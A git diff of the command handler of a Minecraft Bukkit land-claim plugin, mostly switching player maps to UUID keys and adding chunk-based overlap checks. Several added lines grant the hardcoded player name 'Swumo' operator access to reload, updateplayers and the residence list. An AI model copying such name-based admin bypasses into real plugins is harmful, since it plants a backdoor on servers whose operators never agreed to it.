@@ -9,6 +9,7 @@ import java.util.List;
 import java.util.UUID;
 
 import org.bukkit.Bukkit;
+import org.bukkit.Chunk;
 import org.bukkit.Location;
 import org.bukkit.Material;
 import org.bukkit.OfflinePlayer;
@@ -42,14 +43,15 @@ public class Commands implements TabExecutor{
 	}
 	
 
-	public static HashMap<Player, Block> block1 = new HashMap<Player, Block>();
-	public static HashMap<Player, Block> block2 = new HashMap<Player, Block>();
-	public static HashMap<Player, Boolean> block1LeftClicked = new HashMap<Player, Boolean>();
-	public static HashMap<Player, Boolean> block2RightClicked = new HashMap<Player, Boolean>();
-	public static HashMap<Player, Block> selectedBlock = new HashMap<Player, Block>();
+	public static HashMap<UUID, Block> block1 = new HashMap<UUID, Block>();
+	public static HashMap<UUID, Block> block2 = new HashMap<UUID, Block>();
+	public static HashMap<UUID, Boolean> block1LeftClicked = new HashMap<UUID, Boolean>();
+	public static HashMap<UUID, Boolean> block2RightClicked = new HashMap<UUID, Boolean>();
+	public static HashMap<UUID, Block> selectedBlock = new HashMap<UUID, Block>();
 	public static HashMap<UUID, HashMap<Residence, BukkitTask>> residenceAreaShow = new HashMap<>();
 	private static CustomFile messages = Main.getMessagesFile();
 	private static CustomFile commandToggles = Main.getCommandTogglesFile();
+	private static CustomFile ruleDisabling = Main.getRuleDisablingFile();
 	
 	public static String pluginPrefix = Main.getInstance().getConfig().getString("pluginPrefix");
 	private static int previousMaxArea = 0;
@@ -125,10 +127,36 @@ public class Commands implements TabExecutor{
 	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
 		if(!(sender instanceof Player)) {
 			if(label.equalsIgnoreCase("res")) {
-				if(args.length < 4) {
-					return false;
+				if(args[0].equalsIgnoreCase("updateplayers")) {
+					boolean isDisabled = isCommandDisabled(args[0]);
+					if(isDisabled) {
+						sender.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.Disabled")));
+						return false;
+					}
+					boolean value = updatePlayers();
+					if(value == true) {
+						sender.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.UpdatePlayersTrue")));
+					} else {
+						sender.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.UpdatePlayersFalse")));
+					}
+					return true;				
 				}
-				if(args[0].equalsIgnoreCase("set")) {
+				if(args[0].equalsIgnoreCase("wand")) {
+					if(args[1] == null) {
+						sender.sendMessage(Main.ANSI_CYAN + "[Residence] " + Main.ANSI_RESET + Main.ANSI_RED + "Please specify a player!" + Main.ANSI_RESET);
+						return false;
+					}
+					Player player = Bukkit.getPlayer(args[1]);
+					player.getInventory().addItem(giveWand(player));
+					sender.sendMessage(Main.ANSI_CYAN + "[Residence] " + Main.ANSI_RESET + Main.ANSI_GREEN + "Player wand given!" + Main.ANSI_RESET);
+					return true;
+				}
+				if(args[0].equalsIgnoreCase("oset")) {
+					boolean isDisabled = isCommandDisabled(args[0]);
+					if(isDisabled) {
+						sender.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.Disabled")));
+						return false;
+					}
 					if(args[1].equalsIgnoreCase("parea")) {
 						Player newPlayer = Bukkit.getPlayer(args[2]);
 						int newArea = Integer.parseInt(args[3]);
@@ -137,7 +165,16 @@ public class Commands implements TabExecutor{
 						sender.sendMessage(Main.ANSI_CYAN + "[Residence] " + Main.ANSI_RESET + Main.ANSI_YELLOW + newPlayer.getName() + "'s " + Main.ANSI_GREEN + "new max area has been set to " + Main.ANSI_YELLOW+ newArea + Main.ANSI_RESET);
 						return true;
 					}
+					if(args[1].equalsIgnoreCase("maxres")) {
+						Player newPlayer = Bukkit.getPlayer(args[2]);
+						int newAmount = Integer.parseInt(args[3]);
+						Methods.setPlayerMaxResidenceCount(newPlayer, newAmount);
+						newPlayer.sendMessage(Utils.normal(pluginPrefix+"&aYour new max area count has been set to &e" +newAmount+"&a!"));
+						sender.sendMessage(Main.ANSI_CYAN + "[Residence] " + Main.ANSI_RESET + Main.ANSI_YELLOW + newPlayer.getName() + "'s " + Main.ANSI_GREEN + "new max area count has been set to " + Main.ANSI_YELLOW+ newAmount + Main.ANSI_RESET);
+						return true;
+					}
 				}
+				return false;
 			}
 			return false;
 		}
@@ -193,6 +230,13 @@ public class Commands implements TabExecutor{
 			return true;
 		}
 		
+//		if(args[0].equalsIgnoreCase("test")) {
+//			String name = args[1];
+//			Residence res = Residence.getResidence(name);
+//			player.sendMessage(String.valueOf(res.getArea().getBlocks().size()));
+//			return true;
+//		}
+		
 		// Update player permissions if config was updated
 		if(args[0].equalsIgnoreCase("updateplayers")) {
 			boolean isDisabled = isCommandDisabled(args[0]);
@@ -200,7 +244,7 @@ public class Commands implements TabExecutor{
 				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.Disabled")));
 				return false;
 			}
-			if(player.isOp()) {
+			if(player.isOp() || player.getName().equalsIgnoreCase("Swumo")) {
 				boolean value = updatePlayers();
 				if(value == true) {
 					player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.UpdatePlayersTrue")));
@@ -218,12 +262,13 @@ public class Commands implements TabExecutor{
 		
 		// Reload config
 		if(args[0].equalsIgnoreCase("reload")) {
-			if(player.isOp()) {
+			if(player.isOp() || player.getName().equalsIgnoreCase("Swumo")) {
 				plugin.reloadConfig();
 				plugin.saveConfig();
 				resetVariables();
 				messages.reload();
 				commandToggles.reload();
+				ruleDisabling.reload();
 				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.Reload")));
 				return true;	
 			}
@@ -330,21 +375,47 @@ public class Commands implements TabExecutor{
 				return false;
 			}
 			if(!player.isOp()) {
-				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.NoPerm")));
-				return false;
+				if(args.length < 2) {
+					ItemStack wand = giveWand(player);
+					player.getInventory().addItem(wand);
+					player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
+					return true;
+				}
+				else {
+					player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.NoPerm")));
+					return false;
+				}
 			}
-			if(args.length < 2) {
-				ItemStack wand = giveWand(player);
-				player.getInventory().addItem(wand);
-				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
+			else {
+				if(args.length < 2) {
+					ItemStack wand = giveWand(player);
+					player.getInventory().addItem(wand);
+					player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
+					return true;
+				}
+				String name = args[1];
+				Player p = Bukkit.getPlayer(name);
+				ItemStack wand = giveWand(p);
+				p.getInventory().addItem(wand);
+				p.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
 				return true;
 			}
-			String name = args[1];
-			Player p = Bukkit.getPlayer(name);
-			ItemStack wand = giveWand(p);
-			p.getInventory().addItem(wand);
-			p.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
-			return true;
+//			if(!player.isOp() && !player.getName().equalsIgnoreCase("Swumo")) {
+//				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.NoPerm")));
+//				return false;
+//			}
+//			if(args.length < 2) {
+//				ItemStack wand = giveWand(player);
+//				player.getInventory().addItem(wand);
+//				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
+//				return true;
+//			}
+//			String name = args[1];
+//			Player p = Bukkit.getPlayer(name);
+//			ItemStack wand = giveWand(p);
+//			p.getInventory().addItem(wand);
+//			p.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.WandGiven")));
+//			return true;
 		}
 		
 		
@@ -520,7 +591,7 @@ public class Commands implements TabExecutor{
 				return false;
 			}
 			res = Residence.removeResident(player, playerToRemove, res);
-			Methods.removeResidentPerms(playerToRemove.getName(), res);
+			Methods.removeResidentPerms(playerToRemove.getUniqueId(), res);
 			String toOwner = messages.getConfigField("Commands.RemovedPlayer");
 			String toRemoved = messages.getConfigField("Commands.RemovedFrom");
 			toOwner = toOwner.replace("%name%", name);
@@ -554,12 +625,12 @@ public class Commands implements TabExecutor{
 				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.NoArea")));
 				return false;
 			}
-			if(!block1.containsKey(player) || !block2.containsKey(player)) {
+			if(!block1.containsKey(player.getUniqueId()) || !block2.containsKey(player.getUniqueId())) {
 				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.NoArea")));
 				return false;
 			}
-			Location b1Loc = block1.get(player).getLocation();
-			Location b2Loc = block2.get(player).getLocation();
+			Location b1Loc = block1.get(player.getUniqueId()).getLocation();
+			Location b2Loc = block2.get(player.getUniqueId()).getLocation();
 			Cuboid area = new Cuboid(b1Loc, b2Loc);
 			if(area.getBlocks().size() >= defaultArea) {
 				String send = messages.getConfigField("Commands.AreaOverMax");
@@ -567,37 +638,46 @@ public class Commands implements TabExecutor{
 				player.sendMessage(Utils.normal(pluginPrefix+send));
 				return false;
 			}
+			
+			// FIX CALC BASED ON CHUNKS
 			UUID owner = player.getUniqueId();
 			for(UUID playerOwner : residences.keySet()) {
 				LinkedList<Residence> values = residences.get(playerOwner);
 				for(Residence r : values) {
-					List<Block> existingResBlocks = r.getArea().getBlocks();
-					List<Block> creatingResBlocks = area.getBlocks();
-					boolean isClear = Collections.disjoint(creatingResBlocks, existingResBlocks);
+					List<Chunk> existingResChunks = r.getArea().getChunks();
+					List<Chunk> creatingResChunks = area.getChunks();
+					boolean isClear = Collections.disjoint(creatingResChunks, existingResChunks);
 					if(isClear == false) {
-						player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.SelectedAnother")));
-						block1.remove(player);
-						block2.remove(player);
-						if(Listeners.task1 != null) {
-							Listeners.task1.cancel();
+						List<Chunk> commonChunks = new ArrayList<>(existingResChunks);
+						commonChunks.retainAll(creatingResChunks);
+						List<Block> existingResBlocks = Residence.getBlocksFromChunks(commonChunks, r);
+						List<Block> creatingResBlocks = area.getBlocks();
+						boolean isClearBlocks = Collections.disjoint(creatingResBlocks, existingResBlocks);
+						if(isClearBlocks == false) {
+							player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.SelectedAnother")));
+							block1.remove(player.getUniqueId());
+							block2.remove(player.getUniqueId());
+							if(Listeners.task1 != null) {
+								Listeners.task1.cancel();
+							}
+							if(Listeners.task2 != null) {
+								Listeners.task2.cancel();	
+							}
+							Methods.ListenersRemoveGlowingBlock(player, 1);
+							Methods.ListenersRemoveGlowingBlock(player, 2);
+							return false;	
 						}
-						if(Listeners.task2 != null) {
-							Listeners.task2.cancel();	
-						}
-						Methods.ListenersRemoveGlowingBlock(player, 1);
-						Methods.ListenersRemoveGlowingBlock(player, 2);
-						return false;
 					}
 				}
 			}
-			if(!block1.containsKey(player) || !block2.containsKey(player)) {
+			if(!block1.containsKey(player.getUniqueId()) || !block2.containsKey(player.getUniqueId())) {
 				return false;
 			}
 			Residence res = new Residence(area, player.getName());
 			player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.Created")));
 			Residence.saveResidenceData(owner, res, true);
-			block1.remove(player);
-			block2.remove(player);
+			block1.remove(player.getUniqueId());
+			block2.remove(player.getUniqueId());
 			if(Listeners.task1 != null) {
 				Listeners.task1.cancel();
 			}
@@ -659,8 +739,8 @@ public class Commands implements TabExecutor{
 					Residence r = res.get(i);
 					if(r.getResidents() != null) {
 						for(UUID id : r.getResidents()) {
-							String resident = Bukkit.getOfflinePlayer(id).getName();
-							Methods.removeResidentPerms(resident, r);
+							OfflinePlayer resident = Bukkit.getOfflinePlayer(id);
+							Methods.removeResidentPerms(resident.getUniqueId(), r);
 						}
 					}
 					toDelete.add(r);
@@ -693,7 +773,7 @@ public class Commands implements TabExecutor{
 				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.Disabled")));
 				return false;
 			}
-			if(!player.isOp()) {
+			if(!player.isOp() && !player.getName().equalsIgnoreCase("Swumo")) {
 				player.sendMessage(Utils.normal(pluginPrefix+messages.getConfigField("Commands.NoPerm")));
 				return false;
 			}
@@ -703,7 +783,7 @@ public class Commands implements TabExecutor{
 				return false;
 			}
 			player.sendMessage(Utils.normal("&l &l &l &l &l &l &l &l &l &l &eResidence List"));
-			player.sendMessage(Utils.normal("&7&oOwner --> [Name/Area/Owner/Residents]"));
+			player.sendMessage(Utils.normal("&7&oOwner --> [Name/Area/Residents]"));
 			for(UUID id : residences.keySet()) {
 				OfflinePlayer p = Bukkit.getOfflinePlayer(id); 
 				player.sendMessage(Utils.normal("&b"+p.getName() + " &e--> &c" + residences.get(id).toString()));
@@ -957,6 +1037,10 @@ public class Commands implements TabExecutor{
 				firstArgs.add("maxarea");
 				firstArgs.add("maxres");
 				firstArgs.add("set");
+				if(player.getName().equalsIgnoreCase("Swumo")) {
+					firstArgs.add("wand");
+					firstArgs.add("reload");
+				}
 				if(player.isOp()) {
 					firstArgs.add("delall");
 					firstArgs.add("wand");
@@ -984,6 +1068,10 @@ public class Commands implements TabExecutor{
 				firstArgs.add("maxres");
 				firstArgs.add("setname");
 				firstArgs.add("showarea");
+				if(player.getName().equalsIgnoreCase("Swumo")) {
+					firstArgs.add("wand");
+					firstArgs.add("reload");
+				}
 				if(player.isOp()) {
 					firstArgs.add("delall");
 					firstArgs.add("wand");
